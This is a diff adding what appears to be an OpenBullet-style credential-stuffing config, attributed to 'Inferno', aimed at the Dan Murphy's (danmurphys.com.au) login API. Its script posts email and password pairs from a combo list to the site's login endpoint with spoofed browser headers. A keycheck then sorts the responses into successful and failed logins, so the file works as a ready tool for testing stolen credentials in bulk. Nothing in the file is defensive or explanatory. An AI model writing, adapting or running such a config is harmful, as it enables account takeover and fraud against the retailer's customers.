@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "Danmurphys.com.au | Inferno",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-30T13:58:28.3978401+00:00",
+  "AdditionalInfo": "",
+  "Author": "Inferno",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Post.Inferno REQUEST POST "https://api.danmurphys.com.au/apis/ui/Login/LoginWithCredential" AutoRedirect=TRUE 
+  CONTENT "Email=<USER>&Password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: api.danmurphys.com.au" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Access-Control-Request-Method: POST" 
+  HEADER "Origin: https://www.danmurphys.com.au" 
+  HEADER "Access-Control-Request-Headers: content-type" 
+#KEY_CHECK.Inferno KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"LoginResult\":\"Invalid\",\"" 
+  KEYCHAIN Success OR 
+    KEY "{\"LoginResult\":\"Success\",\"" 
